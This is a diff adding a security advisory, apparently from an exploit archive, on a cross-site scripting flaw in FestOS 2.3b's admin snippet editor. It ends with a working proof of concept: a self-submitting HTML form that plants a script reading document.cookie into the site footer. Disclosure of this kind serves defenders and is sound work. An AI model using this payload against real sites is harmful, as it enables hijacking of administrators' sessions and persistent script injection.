@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/41725/info
+
+FestOS is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+FestOS version 2.3b is vulnerable; other versions may also be affected.
+
+<form action="http://www.example.com/admin/do_snippets_edit.php?tabname=Pages" method="post" name="main" > <input type="hidden" name="snippetID" value="1" /> <input type="hidden" name="title" value="Site footer" /> <input type="hidden" name="active" value="1" /> <input type="hidden" name="contents" value='footer"><script>alert(document.cookie)</script>' /> </form> <script> document.main.submit(); </script> 
